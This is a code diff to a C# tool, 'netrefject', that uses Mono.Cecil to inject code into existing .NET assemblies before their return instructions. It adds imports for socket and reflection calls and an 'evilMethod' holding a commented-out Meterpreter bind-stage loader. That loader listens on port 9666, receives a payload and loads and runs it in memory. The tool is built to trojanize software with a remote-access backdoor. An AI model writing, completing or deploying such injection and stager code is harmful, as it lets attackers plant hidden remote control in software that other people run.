@@ -2,10 +2,14 @@
 using System.Collections.Generic;
 using System.Text;
 using System.Reflection;
+using System.Linq;
+
+//Payload usings
+using System.IO;
+using System.Net.Sockets;
 
 using Mono.Cecil;
 using Mono.Cecil.Cil;
-using System.Linq;
 
 namespace netrefject
 {
@@ -115,7 +119,7 @@ namespace netrefject
             }
             catch(Exception e)
             {
-                Console.WriteLine(e.Message);
+                Console.WriteLine(e.Message + ":" + e.StackTrace);
             }
 
             return mi;
@@ -159,12 +163,11 @@ namespace netrefject
             ILProcessor ilp = m1.Body.GetILProcessor();
             int originaInstructionCount = m1.Body.Instructions.Count;
 
+            //importEvilMethodClasses(m1);
             m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
-
+            
             for (int i = 0; i < originaInstructionCount; i++)
             {
-                //Just before ret 
-                //Yes offset stuff is fucked up, will fix later
                 if (m1.Body.Instructions[i].OpCode == OpCodes.Ret)
                 {
                     Instruction retCall = m1.Body.Instructions[i];
@@ -178,19 +181,8 @@ namespace netrefject
                             ilp.InsertBefore(retCall,instructions[iI]);
                         }
                     }
-                    //retCall.Offset = retCall.Offset + instructionCounter;
                 }
             }
-
-            //m1.Body.Variables.Add(new VariableDefinition(targetType.Module.ImportReference(typeof(System.Console))))
-            
-
-            /*ilp.Body.Variables.Add(targetType.Module.ImportReference(System.Console.GetT));
-            foreach (var v in vars)
-            {
-                var nv = new VariableDefinition(targetType.Module.ImportReference(v.VariableType));
-                m1.Body.Variables.Add(nv);
-            }*/
 
             Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());
 
@@ -209,13 +201,132 @@ namespace netrefject
             return m1.Body.Instructions.ToArray();
         }
 
+        private void importEvilMethodClasses(MethodDefinition m1){
+            //Mui Importante: Import all your function references for your evilMethod here
+            m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
+
+            //TcpListener Constructor
+            m1.Module.Import(typeof(TcpListener).GetConstructor(
+                new[] {
+                    typeof(System.Net.IPAddress),  
+                    typeof(int)
+                })
+            );
+            //TcpListener.Start 
+            m1.Module.Import(typeof(TcpListener).GetMethod("Start",new[]{typeof(int)}));
+            //TcpListener.AcceptTcpClient
+            m1.Module.Import(typeof(TcpListener).GetMethod("AcceptTcpClient"));
+            //TcpListener.Stop
+            m1.Module.Import(typeof(TcpListener).GetMethod("Stop"));
+
+            //TcpClient.GetStream
+            m1.Module.Import(typeof(TcpClient).GetMethod("GetStream"));
+
+            //BinaryReader Constructor (NetworkStream)
+            m1.Module.Import(typeof(BinaryReader).GetConstructor(
+                new []{
+                    typeof(NetworkStream)
+                })
+            );
+
+            //BinaryReader Constructor (MemoryStream)
+            m1.Module.Import(typeof(BinaryReader).GetConstructor(
+                new []{
+                    typeof(MemoryStream)
+                })
+            );            
+
+            //BinaryReader.ReadInt32
+            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadInt32"));
+
+            //BinaryReader.ReadBytes
+            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadBytes",new []{typeof(int)}));
+
+            //Stream.Seek (BinaryReader.BaseStream.Seek)
+            m1.Module.Import(typeof(Stream).GetMethod("Seek",
+                new []{
+                    typeof(int),
+                    typeof(SeekOrigin)
+                }
+            ));
+            
+            //MemoryStream Constructor
+            m1.Module.Import(typeof(MemoryStream).GetConstructor(
+                new[] {
+                    typeof(byte[])
+                }
+            ));
+
+            //Assembly.Load
+            m1.Module.Import(typeof(Assembly).GetMethod("Load",new []{typeof(byte[])}));
+            //Assembly.GetType
+            m1.Module.Import(typeof(Assembly).GetMethod("GetType",new []{typeof(string)}));
+
+            //Type.InvokeMember
+            m1.Module.Import(typeof(Type).GetMethod("InvokeMember",
+                new[]{
+                    typeof(string),
+                    typeof(BindingFlags),
+                    typeof(Binder),
+                    typeof(Object),
+                    typeof(Object[])
+                }
+            ));
+        }
         private void evilMethod()
         {
-            string a = ("This is the beginning of the evil method code that's being injected into the assembly");
+            //Console.WriteLine("[!!] I am evilMethod starting");
+            var hello = "hello";
+            
+            //Meterpreter testing code taken from 
+            //https://github.com/OJ/clr-meterpreter
+            /*
+            var port = 9666;
+            var tcpListener = new TcpListener(System.Net.IPAddress.Any, port);
+            tcpListener.Start(1);
 
-            Console.WriteLine("I am evilMethod");
+            var tcpClient = tcpListener.AcceptTcpClient();
+            if (tcpClient != null && tcpClient.Connected)
+            {
+                tcpListener.Stop();
+                using (var s = tcpClient.GetStream())
+                using (var r = new BinaryReader(s))
+                {
+                    var fullStageSize = r.ReadInt32();
+                    var fullStage = r.ReadBytes(fullStageSize);
+                    
+                    #region LoadStage
+                    var bytes = fullStage;
+                    object client = tcpClient;
 
-            string b = ("This is the end of the evil method");
+                    using (var memStream = new MemoryStream(bytes))
+                    using (var memReader = new BinaryReader(memStream))
+                    {
+                        // skip over the MZ header
+                        memReader.ReadBytes(2);
+                        // read in the length of metsrv
+                        var metSrvSize = memReader.ReadInt32();
+                        // Point the reader to the configuration
+                        memReader.BaseStream.Seek(metSrvSize, SeekOrigin.Begin);
+
+                        var assembly = Assembly.Load(bytes);
+                        var type = assembly.GetType("Met.Core.Server");
+                        try
+                        {
+                            type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
+                                null, null, new object[] { memReader, client });
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e.Message);
+                            //System.Diagnostics.Debugger.Break();
+                        }
+                    }
+                    #endregion
+                }
+            }*/        
+
+            //Console.WriteLine("[!!] I am evilMethod ending");
         }
     }
 }
